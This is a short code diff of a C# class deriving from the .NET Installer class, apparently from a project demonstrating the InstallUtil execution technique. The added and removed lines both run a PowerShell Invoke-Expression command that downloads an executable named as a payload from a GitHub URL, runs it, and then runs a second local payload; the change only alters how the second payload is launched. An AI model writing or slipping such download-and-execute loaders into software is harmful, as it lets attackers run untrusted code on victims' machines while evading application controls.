@@ -19,7 +19,7 @@ public class Sample : System.Configuration.Install.Installer
     {
         PowerShell ps = PowerShell.Create();
         ps.AddCommand("Invoke-Expression");
-        ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntilOnlinePayload.exe';$output = 'Csharp4InstallUntilOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp4InstallUntilOnlinePayloadDownloaded.exe;Start-Process -FilePath 'Csharp4InstallUntilOfflinePayload.exe';");
+        ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntilOnlinePayload.exe';$output = 'Csharp4InstallUntilOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp4InstallUntilOnlinePayloadDownloaded.exe;./Csharp4InstallUntilOfflinePayload.exe;");
         ps.Invoke();
     }
 }
